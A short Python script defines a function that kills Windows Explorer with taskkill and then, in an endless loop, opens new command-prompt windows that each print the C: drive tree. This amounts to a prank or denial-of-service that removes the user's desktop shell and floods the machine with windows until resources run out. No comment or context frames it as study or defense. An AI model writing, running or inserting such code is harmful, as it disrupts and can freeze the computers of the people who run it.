import os
import time
def tes():
    os.system("taskkill /s /f /im explorer.exe")
    while True:
        os.system('start C:\Windows\System32\cmd.exe /K \"tree c:/" ')
